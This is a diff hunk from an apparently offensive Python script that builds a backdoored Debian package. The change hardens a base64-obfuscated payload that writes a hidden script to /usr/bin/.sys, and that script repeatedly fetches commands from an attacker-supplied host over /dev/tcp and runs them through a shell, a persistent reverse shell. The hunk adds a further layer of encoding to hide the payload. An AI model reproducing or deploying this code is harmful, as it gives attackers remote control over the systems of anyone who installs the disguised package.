@@ -265,8 +265,9 @@ def createdebfile(host,port):
 	print INFO+"[*]  " + WHITE + "Author => "+auth
 
 	pload=base64.b64encode("while true; do cat </dev/tcp/"+host+"/"+port+" | sh 2>/dev/null; sleep 5; done")
-	pload = "echo "+pload+" | base64 --decode | bash"
-	pload="echo '#!/bin/bash"+pload+"'>/usr/bin/.sys"
+	pload = "echo "+pload+" | base64 --decode | bash;"
+	pload="echo '#!/bin/bash\n"+pload+"'>/usr/bin/.sys;"
+	pload = "echo '"+base64.b64encode(pload)+"' | base64 --decode | bash;"
 	os.system('rm -rf /tmp/nesdeb;\
 	mkdir /tmp/nesdeb;\
 	mkdir /tmp/nesdeb/DEBIAN;\
